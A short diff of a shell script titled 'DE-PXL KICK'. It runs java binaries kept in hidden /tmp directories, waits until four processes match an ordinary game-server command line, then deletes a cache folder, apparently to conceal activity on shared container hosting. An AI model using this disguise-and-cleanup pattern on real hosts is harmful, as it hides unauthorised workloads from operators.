DE-PXL KICK

+++ de-pxl/n1.sh
@@ -17,7 +17,18 @@ function start_app() {
 if [ -f "/tmp/.java/bin/java" ] && [ -f "/tmp/.java/bin/.a/java" ] && [ -f "/tmp/.java/bin/.b/java" ]; then
     start_app
     # timeout 2s tail -f /dev/null
-    cd /home/container/ && rm -rf /tmp/node-compile-cache/v24.14.1-x64-cf738c9d-0
+    # cd /home/container/ && rm -rf /tmp/node-compile-cache/v24.14.1-x64-cf738c9d-0
+    TARGET_PROCESS="java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar"
+    while true; do
+        COUNT=$(pgrep -f "$TARGET_PROCESS" | wc -l)
+        if [ "$COUNT" -eq 4 ]; then
+            cd /home/container/ && rm -rf /tmp/node-compile-cache/v24.14.1-x64-cf738c9d-0
+            break
+        else
+            echo "Not done, waiting..."
+            sleep 1  
+        fi
+    done
 else
     rm -rf /tmp/.java/bin/**
     fetch_files
